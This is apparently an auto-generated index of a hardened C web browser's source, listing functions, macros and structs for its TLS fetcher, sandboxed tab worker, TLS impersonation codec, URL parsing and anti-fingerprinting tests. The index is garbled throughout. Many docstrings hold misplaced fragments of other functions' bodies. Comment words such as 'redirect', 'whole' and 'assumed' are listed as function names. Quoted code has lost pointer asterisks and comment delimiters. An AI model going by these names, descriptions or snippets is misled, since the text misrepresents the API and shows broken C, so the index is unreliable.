- `name_is_pq_sig` (line 611) `static int name_is_pq_sig(int pknid)` - *if (grown == NULL) { sink->overflow = 2; /* OOM marker return 0; } sink->data = grown; sink->cap = newcap; } memcpy(sink->data + sink->len, ptr, incoming); sink->len += incoming; sink->data[sink->len] = '\0'; return incoming; } /* Returns nonzero if the short or long name denotes an ML-DSA / SLH-DSA signature.*
- `inspect_chain` (line 621) `static int inspect_chain(SSL *ssl, sf_chain_info *info, char *sigbuf, size_t sigbuf_len)` - *Walks the verified chain into *info. sigbuf receives the leaf signature alg name. * Returns 0 on success, nonzero if the chain could not be inspected.*
- `map_curl_error` (line 673) `static sf_status map_curl_error(CURLcode rc, const body_sink *sink)`
- `sf_perform` (line 716) `static sf_status sf_perform(const char *url, const sf_config *cfg, sf_response *out,
            ...` - *The shared request engine for sf_get and sf_post. When post_body == NULL it is a GET; otherwise it is a POST carrying body (post_len bytes) with content_type. The full TLS/PQ/chain policy is enforced identically for both methods (Zero Trust: * the method changes nothing about how the connection is judged).*
- `redirect` (line 823) `* redirect (CURLOPT_UNRESTRICTED_AUTH is 0), so credentials never leak to a
     * different orig...`
- `sf_get` (line 979) `sf_status sf_get(const char *url, const sf_config *cfg, sf_response *out)`
- `sf_post` (line 983) `sf_status sf_post(const char *url, const sf_config *cfg,
                  const void *body, size...`
- `sf_get_follow` (line 997) `sf_status sf_get_follow(const char *url, const sf_config *cfg, sf_response *out,
                ...`

**Macros:**
- `_POSIX_C_SOURCE` (line 11)

**Structs:**
- `body_sink` (line 433)
- `tls_capture` (line 446) - *Snapshot of the negotiated TLS state. curl exposes the live SSL* only while a transfer is in progress (via CURLINFO_TLS_SSL_PTR); after curl_easy_perform returns, internals is NULL. So we capture from inside the header/write callbacks and copy everything into owned storage, since SSL_get0_group_name / * the chain pointers are only valid while the SSL object lives.*
- `fetch_ctx` (line 456)

#### `tab.c`
**Path:** `src/tab.c`

**Functions:**
- `child_reset_page` (line 105) `static void child_reset_page(child_state *cs)`
- `policy` (line 121) `* policy (host blocklist/tracker filter, realm routing, TLS-PQ) before fetching, so a
 * compromi...`
- `run_js` (line 175) `* regardless of run_js (a no-JS load simply never records a request). */
static int child_load(ch...`
- `write_field` (line 242) `static int write_field(int fd, const char *s)` - *Writes one length-prefixed string field (the write mirror of read_field): a size_t * length then the bytes, with NULL/empty encoded as length 0.*
- `blocks` (line 270) `*
 * The scalar fields are marshalled as bulk int32 blocks (head[6], block A[36], the
 * grid arr...`
- `FB_MAX_FILE_BYTES` (line 401) `* FB_MAX_FILE_BYTES (the buffer enforces all), so a hostile worker cannot amplify
 * the stream. ...`
- `budget_remaining_ms` (line 431) `static uint64_t budget_remaining_ms(const struct timespec *start, uint64_t budget_ms)` - *Milliseconds of `budget_ms` still left since `start` (CLOCK_MONOTONIC), 0 if spent. * Used to share one page-wide JS budget across the inline scripts run individually.*
- `ctype_is_javascript` (line 445) `static int ctype_is_javascript(const char *ctype)` - *Content-Type gate for an external script's response (anti type-confusion, fail closed for real content types): accept a missing/empty type -- classic-script behaviour -- or one containing "javascript"/"ecmascript"; refuse anything else, * so an HTML error page or a JSON body is never evaluated as script.*
- `ctype_is_css` (line 454) `static int ctype_is_css(const char *ctype)` - *Content-Type gate for an external stylesheet (Hito 27), same shape as the script gate: a missing/empty type is accepted, anything else must mention "css" -- an * HTML 404 page or a script body is never parsed as a sheet.*
- `log_external_skip` (line 462) `static void log_external_skip(fb_buffer *log, const char *kind, const char *why,
                ...` - *Freebug note about an external subresource (script/stylesheet) that was not used (skipped or refused). The raw hostile src is bounded by the message * buffer; freebug caps the entry.*
- `run` (line 480) `* already contains a PV_VIDEO run (avoids duplicates on repeated injection).
 * Call after every ...`
- `window` (line 513) `* net window (cs->net_active). */
static void child_fetch_stylesheets(child_state *cs)`
- `child_handle_load` (line 557) `static void child_handle_load(int wfd, child_state *cs, const char *html, size_t len,
           ...`
- `child_next_timer_ms` (line 818) `static int32_t child_next_timer_ms(child_state *cs)` - *Smallest pending JS timer delay (__nextTimerMs), or -1 when JS is absent, the * eval fails, or nothing is pending. Does NOT touch the console transcript.*
- `child_handle_mutation` (line 833) `static void child_handle_mutation(int wfd, child_state *cs, int is_tick,
                        ...` - *Fire click handlers for node_id (OP_CLICK) or advance the virtual timer clock (OP_TICK), then re-derive the view so the parent can repaint mutations caused by the handlers. Response format matches the tail of OP_LOAD: [ok:int32] [title_len][title][text_len][text][view][nav_len=''][nav_replace][console] * [next_timer_ms:int32]. Neither produces a navigation.*
- `child_handle_click` (line 897) `static void child_handle_click(int wfd, child_state *cs, dom_node_id node_id)`
- `child_handle_tick` (line 901) `static void child_handle_tick(int wfd, child_state *cs, int32_t elapsed_ms)`
- `child_handle_event` (line 911) `static void child_handle_event(int wfd, child_state *cs)`
- `child_handle_mouse` (line 960) `static void child_handle_mouse(int wfd, child_state *cs)` - *Handles a mouse DOM event (OP_MOUSE). Reads: node_id:int32, event_type_len:size_t, event_type, client_x:int32, client_y:int32, * button:int32. Fires JS handlers via jd_fire_mouse_event, re-derives the view.*
- `child_handle_submit` (line 994) `static void child_handle_submit(int wfd, child_state *cs, dom_node_id node_id)` - *Fires a submit event on the form enclosing node_id. Walks up the DOM to find the <form> element, dispatches the event, and reports whether preventDefault was called. Response: [TAG_RESULT][ok:int32][prevented:int32]. No view * re-derivation — the submission is the default action, not a repaint.*
- `child_handle_eval` (line 1028) `static void child_handle_eval(int wfd, child_state *cs, const char *js, size_t len)` - *Response: [ok:int32][is_exception:int32][value_len][value]. ok==0 means a worker-level failure (no page loaded); a JS-level error is ok==1 with the * exception flag set.*
- `child_handle_decode_image` (line 1061) `static void child_handle_decode_image(int wfd, const char *bytes, size_t len)` - *Response: [ok:int32] then, when ok, [w:u32][h:u32][stride:u32][len:size_t][data]. Decoding hostile image bytes happens here, inside the confinement; ok==0 means * the bytes were not a decodable PNG/JPEG (no partial pixels are sent).*
- `child_handle_decode_image_b64` (line 1083) `static void child_handle_decode_image_b64(int wfd, const char *b64, size_t len)` - *data: URI images: the parent only sliced the base64 payload (pure pointer arithmetic, no interpretation); the base64 DECODE of hostile bytes happens here, confined, same as the image-format decode it feeds into. A malformed payload (defense in depth -- render_policy already validated it at the decision layer) * answers exactly like an undecodable image: ok=0, no placeholder-worthy crash.*
- `gen_session_key` (line 1094) `static uint64_t gen_session_key(void)`
- `tab_worker_run` (line 1115) `static void tab_worker_run(int rfd, int wfd)` - *The confined request loop. Runs in the re-exec'd worker image (see * tab_worker_dispatch). Never returns to the caller (always _exit).*
- `parse_worker_fd` (line 1256) `static int parse_worker_fd(const char *s, int *out)` - *else /* OP_DECODE_IMAGE_B64 */       child_handle_decode_image_b64(wfd, buf, len); free(buf); free(url); free(cookies); } child_reset_page(&cs); fb_buffer_free(&cs.log); _exit(0); } /* --- worker entry dispatch (the re-exec'd image lands here from main) --- /* Parses one strictly-decimal, non-negative, sanely-bounded fd. Fail-closed.*
- `tab_parse_worker_args` (line 1267) `int tab_parse_worker_args(int argc, const char *const *argv, int *rfd, int *wfd)`
- `tab_worker_dispatch` (line 1277) `void tab_worker_dispatch(int argc, char **argv)`
- `ignore_sigpipe` (line 1307) `static void ignore_sigpipe(void)` - *A write to a dead child must not kill the parent with SIGPIPE. Idempotent; * no module-level mutable state of our own (the disposition is process-wide).*
- `tab_refresh_alive` (line 1313) `static void tab_refresh_alive(tab *t)`
- `read_field` (line 1333) `static int read_field(int fd, char **out, size_t *out_len)` - *Read one length-prefixed owned field from the child, capped against * amplification. *out is NUL-terminated.*
- `read_view` (line 1349) `static int read_view(int fd, pv_view **out)` - *Reads a display list serialised by write_view into a fresh pv_view. The run * count and each field are capped against amplification from a hostile child.*
- `read_console` (line 1534) `static int read_console(int fd, fb_buffer *out)` - *Reads the console section written by write_console into out (a zero-initialised fb_buffer). Bounds the entry count and each length against amplification from a * hostile child, mirroring the buffer's own caps.*
- `send_request` (line 1571) `static tab_status send_request(tab *t, uint8_t op, const char *payload, size_t len)` - *if (elen != 0) { txt = (char *)malloc(elen); if (txt == NULL) { free(file); return -1; } if (read_full(fd, txt, elen) != 0) { free(txt); free(file); return -1; } } (void)fb_buffer_push_loc(out, level, (txt != NULL) ? txt : "", elen, file, line, col); free(txt); free(file); } return 0; } /* Sends [op][len][payload]; classifies a transport failure as dead vs io.*
- `io_failure` (line 1580) `static tab_status io_failure(tab *t)`
- `exec_worker_child` (line 1589) `static void exec_worker_child(int rfd, int wfd)` - *Child half of the fork: re-exec a fresh worker image so it inherits NONE of the parent's address space (no other tabs' content from tab_slots[], fresh ASLR) and * none of its descriptors except the two pipe ends. Never returns on success.*
- `tab_set_fetcher` (line 1659) `void tab_set_fetcher(tab *t, tab_fetch_fn fn, void *ctx)`
- `tab_set_net_allowed` (line 1665) `void tab_set_net_allowed(tab *t, int allowed)`
- `tab_set_css_allowed` (line 1670) `void tab_set_css_allowed(tab *t, int allowed)`
- `tab_set_cookies` (line 1675) `void tab_set_cookies(tab *t, const char *cookies)`
- `tab_subreq_permitted` (line 1681) `int tab_subreq_permitted(int net_allowed, int css_allowed, const char *method)`
- `answered` (line 1694) `* A refused frame is still consumed and answered (status 0), so the protocol never
 * desyncs. Re...`
- `tab_load` (line 1729) `tab_status tab_load(tab *t, const char *html, size_t len, tab_page *out)`
- `tab_load_ex` (line 1733) `tab_status tab_load_ex(tab *t, const char *html, size_t len, int run_js, tab_page *out)`
- `tab_load_full` (line 1737) `tab_status tab_load_full(tab *t, const char *html, size_t len, const char *page_url,
            ...`
- `tab_click` (line 1881) `tab_status tab_click(tab *t, dom_node_id node_id, tab_page *out)`
- `tab_tick` (line 1888) `tab_status tab_tick(tab *t, int elapsed_ms, tab_page *out)`
- `tab_submit` (line 1898) `tab_status tab_submit(tab *t, dom_node_id node_id, int *prevented)` - *Dispatches a submit event on the form enclosing node_id. Simple response: * [TAG_RESULT][ok:int32][prevented:int32]. No view re-derivation.*
- `tab_read_view` (line 2003) `tab_status tab_read_view(tab *t, tab_page *out)` - *Reads the TAG_RESULT + TAG_VIEW response into *out (titles + view + console). * Used by tab_mutation_request, tab_subreq, tab_dispatch_event.*
- `tab_eval` (line 2058) `tab_status tab_eval(tab *t, const char *js, size_t len, tab_eval_result *out)`
- `tab_decode_image_op` (line 2099) `static tab_status tab_decode_image_op(tab *t, uint8_t op, const char *bytes, size_t len,
        ...` - *Shared by tab_decode_image and tab_decode_image_data_url: sends `bytes` under opcode `op` and parses the [ok][w][h][stride][dlen][pixels] response. *out must * already be zeroed by the caller.*
- `tab_decode_image` (line 2140) `tab_status tab_decode_image(tab *t, const uint8_t *bytes, size_t len, tab_image *out)`
- `tab_decode_image_data_url` (line 2146) `tab_status tab_decode_image_data_url(tab *t, const char *data_url, tab_image *out)`
- `tab_alive` (line 2164) `int tab_alive(const tab *t)`
- `tab_child_pid` (line 2170) `pid_t tab_child_pid(const tab *t)`
- `tab_close` (line 2174) `void tab_close(tab *t)`
- `tab_page_free` (line 2187) `void tab_page_free(tab_page *p)`
- `tab_eval_result_free` (line 2205) `void tab_eval_result_free(tab_eval_result *r)`
- `tab_image_free` (line 2214) `void tab_image_free(tab_image *img)`

**Macros:**
- `_GNU_SOURCE` (line 13)
- `TAB_SCREEN_W` (line 52)
- `TAB_SCREEN_H` (line 53)
- `TAB_MAX_RUNS` (line 57)
- `TAB_MAX_URL` (line 60)
- `TAB_MAX_SUBREQ` (line 75)
- `TAB_MAX_SUBRESOURCE` (line 76)
- `TAB_MAX_JS_JOBS` (line 77)
- `TAB_MAX_EXTERN_CSS` (line 474)

**Structs:**
- `child_state` (line 85)
- `tab` (line 1288)

#### `text_shape.c`
**Path:** `src/text_shape.c`

**Functions:**
- `generic_name` (line 53) `static const char *generic_name(int family)`
- `backend_init` (line 63) `static int backend_init(void)`
- `read_font_file` (line 80) `static unsigned char *read_font_file(const char *path, long *out_n)`
- `load_entry` (line 96) `static int load_entry(tsh_entry *e, int family, int bold, int italic)`
- `get_entry` (line 151) `static tsh_entry *get_entry(int family, int bold, int italic)`
- `tsh_ready` (line 163) `int tsh_ready(void)`
- `tsh_shape` (line 168) `tsh_status tsh_shape(const tsh_font *f, double px, const char *text, size_t len,
                ...`
- `tsh_measure` (line 213) `double tsh_measure(const tsh_font *f, double px, const char *text, size_t len)`
- `tsh_draw` (line 220) `tsh_status tsh_draw(cairo_t *cr, const tsh_font *f, double px,
                    double x, doub...`
- `tsh_shutdown` (line 242) `void tsh_shutdown(void)`

**Macros:**
- `_POSIX_C_SOURCE` (line 11)
- `TSH_MAX_FONT_BYTES` (line 28)
- `TSH_CACHE_SLOTS` (line 32)

**Structs:**
- `tsh_entry` (line 34)

#### `textfield.c`
**Path:** `src/textfield.c`

**Functions:**
- `whole` (line 6) `* the buffer is rejected whole (fail closed), never applied partially.
 */

#include "textfield.h...`
- `tf_clear` (line 19) `void tf_clear(tf_field *f)`
- `tf_set` (line 23) `tf_status tf_set(tf_field *f, const char *s)`
- `tf_insert` (line 34) `tf_status tf_insert(tf_field *f, char c)`
- `tf_backspace` (line 46) `void tf_backspace(tf_field *f)`
- `tf_delete` (line 54) `void tf_delete(tf_field *f)`
- `tf_move` (line 61) `void tf_move(tf_field *f, long delta)`
- `tf_home` (line 72) `void tf_home(tf_field *f)`
- `tf_end` (line 77) `void tf_end(tf_field *f)`
- `tf_text` (line 82) `const char *tf_text(const tf_field *f)`
- `tf_len` (line 86) `size_t tf_len(const tf_field *f)`
- `tf_cursor` (line 90) `size_t tf_cursor(const tf_field *f)`

#### `tls_impersonate.c`
**Path:** `src/tls_impersonate.c`

**Functions:**
- `ti_should_impersonate` (line 17) `int ti_should_impersonate(int host_in_allowlist, int host_js_enabled,
                          i...` - *helper. See spec/tls_impersonate.md and include/tls_impersonate.h.  No I/O, no global state. Two pieces: the triple opt-in gate, and a little-endian, length-prefixed, fail-closed serialization of the parent<->helper messages. Every length is validated against a TI_MAX_* bound before allocation, so a hostile or corrupt frame can never drive an over-read or an unbounded allocation.  #include "tls_impersonate.h" #include <stdlib.h> #include <string.h> /* --- the triple opt-in gate ---*
- `bounded_len` (line 24) `static size_t bounded_len(const char *s, size_t max)` - *#include "tls_impersonate.h" #include <stdlib.h> #include <string.h> /* --- the triple opt-in gate --- int ti_should_impersonate(int host_in_allowlist, int host_js_enabled, int host_in_impersonate) { return (host_in_allowlist && host_js_enabled && host_in_impersonate) ? 1 : 0; } /* --- bounded string length (no dependency on strnlen / feature macros) ---*
- `put_u8` (line 34) `static void put_u8(ti_wr *w, uint8_t v)`
- `put_u32` (line 39) `static void put_u32(ti_wr *w, uint32_t v)`
- `put_u64` (line 47) `static void put_u64(ti_wr *w, uint64_t v)`
- `put_blob` (line 52) `static void put_blob(ti_wr *w, const uint8_t *b, size_t n)`
- `get_u8` (line 64) `static uint8_t get_u8(ti_rd *r)`
- `get_u32` (line 69) `static uint32_t get_u32(ti_rd *r)`
- `get_u64` (line 79) `static uint64_t get_u64(ti_rd *r)`
- `get_bytes` (line 89) `static void get_bytes(ti_rd *r, size_t cap, uint8_t **out, size_t *out_len)` - *| ((uint32_t)r->p[r->off + 3] << 24); r->off += 4; return v; } static uint64_t get_u64(ti_rd *r) { if (r->err || r->off + 8u > r->len) { r->err = 1; return 0; } uint64_t v = 0; for (int i = 0; i < 8; ++i) v |= (uint64_t)r->p[r->off + i] << (8 * i); r->off += 8; return v; } /* Reads a length-prefixed byte blob (<= cap). n==0 yields (NULL,0).*
- `get_str` (line 103) `static char *get_str(ti_rd *r, size_t cap)` - *static void get_bytes(ti_rd *r, size_t cap, uint8_t **out, size_t *out_len) { out = NULL; *out_len = 0; uint32_t n = get_u32(r); if (r->err) return; if ((size_t)n > cap || r->off + (size_t)n > r->len) { r->err = 1; return; } if (n == 0) return; uint8_t *b = malloc(n); if (b == NULL) { r->err = 1; return; } memcpy(b, r->p + r->off, n); r->off += n; out = b; *out_len = n; } /* Reads a length-prefixed string (<= cap chars), NUL-terminates it.*
- `valid_profile` (line 115) `static int valid_profile(int p)`
- `ti_encode_req` (line 121) `size_t ti_encode_req(const ti_req *r, uint8_t *out, size_t out_cap)` - *if (n == UINT32_MAX) { r->err = 1; return NULL; } char *s = malloc((size_t)n + 1u); if (s == NULL) { r->err = 1; return NULL; } if (n != 0) memcpy(s, r->p + r->off, n); s[n] = '\0'; r->off += n; return s; } static int valid_profile(int p) { return p == TI_PROFILE_CHROME_CLASSIC || p == TI_PROFILE_CHROME_MLKEM; } /* --- request codec ---*
- `ti_decode_req` (line 139) `int ti_decode_req(const uint8_t *in, size_t len, ti_req *out)`
- `ti_req_free` (line 165) `void ti_req_free(ti_req *r)`
- `ti_encode_resp` (line 176) `size_t ti_encode_resp(const ti_resp *r, uint8_t *out, size_t out_cap)` - *out->profile = (ti_profile)prof; return 0; } void ti_req_free(ti_req *r) { if (r == NULL) return; free((void *)r->url); free((void *)r->method); free((void *)r->headers); free((void *)r->body); memset(r, 0, sizeof *r); } /* --- response codec ---*
- `ti_decode_resp` (line 195) `int ti_decode_resp(const uint8_t *in, size_t len, ti_resp *out)`
- `ti_resp_free` (line 229) `void ti_resp_free(ti_resp *r)`

#### `ui_layout.c`
**Path:** `src/ui_layout.c`

**Functions:**
- `layout_push` (line 12) `static int layout_push(ui_layout *lay, size_t offset, size_t len)` - *include <stdlib.h>*
- `ui_wrap_text` (line 26) `ui_status ui_wrap_text(const char *text, size_t len, size_t max_cols, ui_layout *out)`
- `ui_layout_free` (line 90) `void ui_layout_free(ui_layout *lay)`
- `ui_clamp_scroll` (line 98) `size_t ui_clamp_scroll(size_t desired, size_t total_lines, size_t viewport_lines)`

#### `url.c`
**Path:** `src/url.c`

**Functions:**
- `ci_prefix` (line 19) `static int ci_prefix(const char *haystack, const char *prefix)` - *dot-segment canonicalisation. Fails closed: a non-https result is never produced; every assembly is bounded and reports overflow rather than truncate.  #define _POSIX_C_SOURCE 200809L #include "url.h" #include <stdlib.h> #include <string.h> /* --- small ASCII helpers (no locale dependence) --- /* Case-insensitive: does haystack start with prefix?*
- `copy_checked` (line 31) `static int copy_checked(char *out, size_t outsz, const char *src)` - */* Case-insensitive: does haystack start with prefix? static int ci_prefix(const char *haystack, const char *prefix) { while (*prefix) { int ch = (unsigned char)*haystack, cp = (unsigned char)*prefix; if (ch >= 'A' && ch <= 'Z') ch += 'a' - 'A'; if (cp >= 'A' && cp <= 'Z') cp += 'a' - 'A'; if (ch != cp) return 0; ++haystack; ++prefix; } return 1; } /* Bounded copy: out gets src (NUL-terminated). Nonzero on overflow.*
- `cat_checked` (line 39) `static int cat_checked(char *out, size_t outsz, const char *src)` - *+haystack; ++prefix; } return 1; } /* Bounded copy: out gets src (NUL-terminated). Nonzero on overflow. static int copy_checked(char *out, size_t outsz, const char *src) { size_t n = strlen(src); if (n + 1 > outsz) return -1; memcpy(out, src, n + 1); return 0; } /* Bounded append: out += src. Nonzero on overflow.*
- `ncat_checked` (line 48) `static int ncat_checked(char *out, size_t outsz, const char *src, size_t n)` - *memcpy(out, src, n + 1); return 0; } /* Bounded append: out += src. Nonzero on overflow. static int cat_checked(char *out, size_t outsz, const char *src) { size_t cur = strlen(out); size_t n = strlen(src); if (cur + n + 1 > outsz) return -1; memcpy(out + cur, src, n + 1); return 0; } /* Bounded append of the first n bytes of src. Nonzero on overflow.*
- `url_has_scheme` (line 57) `int url_has_scheme(const char *s)` - *memcpy(out + cur, src, n + 1); return 0; } /* Bounded append of the first n bytes of src. Nonzero on overflow. static int ncat_checked(char *out, size_t outsz, const char *src, size_t n) { size_t cur = strlen(out); if (cur + n + 1 > outsz) return -1; memcpy(out + cur, src, n); out[cur + n] = '\0'; return 0; } /* --- public: scheme / validation ---*
- `url_is_https` (line 71) `int url_is_https(const char *s)`
- `url_validate_https` (line 78) `url_status url_validate_https(const char *url)`
- `url_authority_len` (line 89) `size_t url_authority_len(const char *url)`
- `out_pop_segment` (line 99) `static void out_pop_segment(char *out, size_t *olen)` - *while (i <= URL_MAX_LEN && url[i] != '\0') ++i; if (i > URL_MAX_LEN) return URL_ERR_NOT_HTTPS; return url_is_https(url) ? URL_OK : URL_ERR_NOT_HTTPS; } size_t url_authority_len(const char *url) { size_t i = 8; /* strlen("https://"); url assumed validated to start with it while (url[i] != '\0' && url[i] != '/') ++i; return i; } /* --- public: dot-segment removal (RFC 3986 section 5.2.4) --- /* Removes the last path segment (and its preceding '/') from out[0..*olen).*
- `url_remove_dot_segments` (line 105) `url_status url_remove_dot_segments(const char *path, char *out, size_t outsz)`
- `dir_len` (line 156) `static size_t dir_len(const char *base)` - *Length of base up to and including the last path '/', ignoring query/fragment. * If the path carries no slash, returns the authority length.*
- `url_resolve_https` (line 166) `url_status url_resolve_https(const char *base, const char *ref,
                             char...`
- `is_space` (line 214) `static int is_space(int c)` - *char norm[URL_MAX_LEN + 1]; url_status ns = url_remove_dot_segments(merged, norm, sizeof norm); if (ns != URL_OK) return ns; out[0] = '\0'; if (ncat_checked(out, outsz, base, auth) != 0) return URL_ERR_OVERFLOW; if (cat_checked(out, outsz, norm) != 0) return URL_ERR_OVERFLOW; } return url_validate_https(out); } /* --- omnibox ---*
- `is_unreserved` (line 218) `static int is_unreserved(int c)`
- `append_query_encoded` (line 226) `static int append_query_encoded(char *out, size_t outsz, const char *src)` - *Percent-encodes src into a query value appended to out (space -> '+', every * non-unreserved byte -> %XX). Nonzero on overflow.*
- `assumed` (line 251) `* assumed (the caller already routed whitespace to search). */
static int looks_like_host(const c...`
- `build_search` (line 299) `static url_status build_search(const char *query, char *out, size_t outsz)`
- `url_omnibox` (line 305) `url_status url_omnibox(const char *input, url_omni_kind *kind, char *out, size_t outsz)`
- `host_equals` (line 375) `static int host_equals(const url_parts *p, const char *want)` - *Any remaining explicit scheme is never executed nor downgraded: search for it * (so "javascript:...", "file:...", "ftp://..." become harmless queries). kind = URL_OMNI_SEARCH; return build_search(start, out, outsz); } /* Case-insensitive exact match of a url_parts hostname against want.*
- `query_find_q` (line 390) `static const char *query_find_q(const char *search, size_t len, size_t *vlen)` - *Returns a pointer to the value of the "q" parameter within a "?a=b&q=v&..." search span, with its length in *vlen (up to the next '&' or the end), or NULL * when there is no "q" key. The leading '?' (if any) is skipped.*
- `url_search_rewrite` (line 407) `url_status url_search_rewrite(const char *url, char *out, size_t outsz)`
- `url_extract_userinfo` (line 427) `url_status url_extract_userinfo(const char *url, char *out, size_t outsz,
                       ...` - *return URL_ERR_NOT_HTTPS; if (p.search_len == 0) return URL_ERR_NOT_HTTPS; size_t qv = 0; const char *q = query_find_q(p.search, p.search_len, &qv); if (q == NULL) return URL_ERR_NOT_HTTPS; const size_t plen = sizeof(URL_SEARCH_ENDPOINT) - 1; if (plen + qv + 1 > outsz) return URL_ERR_OVERFLOW; memcpy(out, URL_SEARCH_ENDPOINT, plen); memcpy(out + plen, q, qv); out[plen + qv] = '\0'; return URL_OK; } /* --- HTTP Basic Auth: extract userinfo from URL ---*
- `url_is_file` (line 521) `int url_is_file(const char *s)` - *username_out = strdup(username); if (*username_out == NULL) return URL_ERR_NULL_ARG; } if (password_out != NULL) { password_out = (pass_len > 0) ? strdup(password) : strdup(""); if (*password_out == NULL) { if (username_out != NULL) { free(*username_out); *username_out = NULL; } return URL_ERR_NULL_ARG; } } return URL_OK; } /* --- local file:// origin ---*
- `url_file_path` (line 527) `const char *url_file_path(const char *s)`
- `url_resolve_file` (line 531) `url_status url_resolve_file(const char *base, const char *ref, char *out, size_t outsz)`
- `url_split` (line 580) `url_status url_split(const char *url, url_parts *out)` - *Confinement: the canonical path must stay inside the base directory subtree. base directory text = base_path[0..dir_end) (ends with '/'), so a strict * prefix match rejects "../" escapes and absolute paths elsewhere. if (strncmp(canon, base_path, dir_end) != 0) return URL_ERR_NOT_LOCAL; out[0] = '\0'; if (cat_checked(out, outsz, "file://") != 0) return URL_ERR_OVERFLOW; if (cat_checked(out, outsz, canon) != 0) return URL_ERR_OVERFLOW; return URL_OK; } /* --- WHATWG-location decomposition (zero-copy; reads side of `location`) ---*

**Macros:**
- `_POSIX_C_SOURCE` (line 8)

#### `webcaps.c`
**Path:** `src/webcaps.c`

**Functions:**
- `wc_safe` (line 9) `wc_caps wc_safe(void)` - *include "webcaps.h"*
- `wc_derive` (line 14) `wc_caps wc_derive(wc_input in)`
- `wc_from_flags` (line 34) `wc_caps wc_from_flags(bool js, bool css, bool images)`
- `wc_render_caps` (line 45) `rdp_caps wc_render_caps(wc_caps c)`

#### `zoom.c`
**Path:** `src/zoom.c`

**Functions:**
- `zm_clamp` (line 13) `int zm_clamp(int pct)` - *define ZM_LADDER_N ((int)(sizeof ZM_LADDER / sizeof ZM_LADDER[0]))*
- `zm_zoom_in` (line 19) `int zm_zoom_in(int pct)`
- `zm_zoom_out` (line 27) `int zm_zoom_out(int pct)`
- `zm_reset` (line 35) `int zm_reset(void)`
- `zm_scale` (line 39) `double zm_scale(int pct)`
- `zm_apply` (line 43) `double zm_apply(double base_px, int pct)`

**Macros:**
- `ZM_LADDER_N` (line 12)

#### `itest_secure_fetch.c`
**Path:** `tests/itest_secure_fetch.c`

**Functions:**
- `main` (line 25) `int main(void)`

**Macros:**
- `CHECK` (line 15)

#### `test_anti_fp.c`
**Path:** `tests/test_anti_fp.c`

**Functions:**
- `test_coarsen_time` (line 17) `static void test_coarsen_time(void **state)` - *Pure primitives: no I/O. Build: make test   ;   ASan: make asan  #include <stdarg.h> #include <stddef.h> #include <stdint.h> #include <setjmp.h> #include <string.h> #include <cmocka.h> #include "anti_fp.h" /* --- clocks ---*
- `test_identity_is_fixed` (line 33) `static void test_identity_is_fixed(void **state)` - *(void)state; uint64_t res = fp_timer_resolution_ms(); assert_true(res > 0); assert_int_equal((int)fp_coarsen_time_ms(0), 0); assert_int_equal((int)fp_coarsen_time_ms(res - 1), 0); assert_int_equal((int)fp_coarsen_time_ms(res), (int)res); assert_int_equal((int)fp_coarsen_time_ms(res + 1), (int)res); /* idempotent on aligned values uint64_t a = fp_coarsen_time_ms(12345); assert_int_equal((int)fp_coarsen_time_ms(a), (int)a); assert_int_equal((int)(a % res), 0); } /* --- normalized identity ---*
- `test_legacy_identity_fixed` (line 60) `static void test_legacy_identity_fixed(void **state)` - *assert_string_equal(fp_accept_language_header(), "en-US,en;q=0.5"); assert_non_null(strstr(fp_accept_language_header(), "en-US")); assert_null(strchr(fp_accept_language(), ';')); assert_string_equal(fp_timezone(), "UTC"); assert_string_equal(fp_platform(), "Linux x86_64"); assert_string_equal(fp_vendor(), ""); assert_true(fp_hardware_concurrency() > 0); assert_true(fp_device_memory_gb() > 0); /* stable across calls assert_string_equal(fp_user_agent(), fp_user_agent()); assert_string_equal(fp_platform(), fp_platform()); } /* --- legacy navigator identity (Hito 30b: blend-in surface) ---*
- `test_boolean_props` (line 73) `static void test_boolean_props(void **state)`
- `test_bucket_screen` (line 82) `static void test_bucket_screen(void **state)` - *assert_string_equal(fp_product_sub(), "20100101"); assert_string_equal(fp_oscpu(), "Linux x86_64"); assert_non_null(fp_build_id()); assert_true(strlen(fp_build_id()) > 0); } static void test_boolean_props(void **state) { (void)state; assert_int_equal(fp_max_touch_points(), 0); assert_int_equal(fp_on_line(), 1); assert_int_equal(fp_cookie_enabled(), 1); } /* --- screen bucketing ---*
- `test_perturb_deterministic` (line 100) `static void test_perturb_deterministic(void **state)` - *fp_bucket_screen(1920, 1080, &w, &h); assert_int_equal(w, 1920); assert_int_equal(h, 1080); fp_bucket_screen(1680, 1050, &w, &h); assert_int_equal(w, 1600); assert_int_equal(h, 900); /* largest that fits fp_bucket_screen(1366, 768, &w, &h); assert_int_equal(w, 1366); assert_int_equal(h, 768); fp_bucket_screen(640, 480, &w, &h); assert_int_equal(w, 800); assert_int_equal(h, 600); /* none fits: smallest } /* --- readback poisoning ---*
- `test_perturb_bounded_lsb` (line 110) `static void test_perturb_bounded_lsb(void **state)`
- `test_perturb_key_sensitive` (line 125) `static void test_perturb_key_sensitive(void **state)`
- `test_perturb_safe_edges` (line 135) `static void test_perturb_safe_edges(void **state)`
- `test_origin_key_deterministic` (line 145) `static void test_origin_key_deterministic(void **state)` - *fp_perturb(a, sizeof a, 1); fp_perturb(b, sizeof b, 2); assert_memory_not_equal(a, b, sizeof a); /* different key => different output } static void test_perturb_safe_edges(void **state) { (void)state; fp_perturb(NULL, 100, 1); /* NULL: no-op, no crash uint8_t x = 5; fp_perturb(&x, 0, 1);     /* len 0: no-op assert_int_equal(x, 5); } /* --- per-origin readback key (fp_origin_key) ---*
- `test_origin_key_per_site` (line 152) `static void test_origin_key_per_site(void **state)`
- `test_origin_key_per_session` (line 164) `static void test_origin_key_per_session(void **state)`
- `test_origin_key_empty_namespace` (line 170) `static void test_origin_key_empty_namespace(void **state)`
- `test_origin_key_unlinks_readback` (line 183) `static void test_origin_key_unlinks_readback(void **state)` - *The property that actually matters: the same canvas buffer poisoned under two different sites' keys diverges, so a tracker cannot link the two readbacks; * and the same site reproduces the same poisoning.*
- `main` (line 196) `int main(void)`

#### `test_box_style.c`
**Path:** `tests/test_box_style.c`

**Functions:**
- `dbl_eq` (line 22) `static int dbl_eq(double a, double b)` - *the display-name helper.  #include <setjmp.h> #include <stdarg.h> #include <stddef.h> #include <stdint.h> #include <string.h> #include <cmocka.h> #include "box_style.h" /* em values are doubles; compare with a small tolerance.*
- `assert_edges` (line 26) `static void assert_edges(bx_edges e, double t, double r, double b, double l)`
- `test_body_has_no_margin` (line 33) `static void test_body_has_no_margin(void **state)`
- `test_paragraph` (line 41) `static void test_paragraph(void **state)`
- `test_heading_ladder` (line 48) `static void test_heading_ladder(void **state)`
- `test_lists` (line 64) `static void test_lists(void **state)`
- `test_blockquote` (line 75) `static void test_blockquote(void **state)`
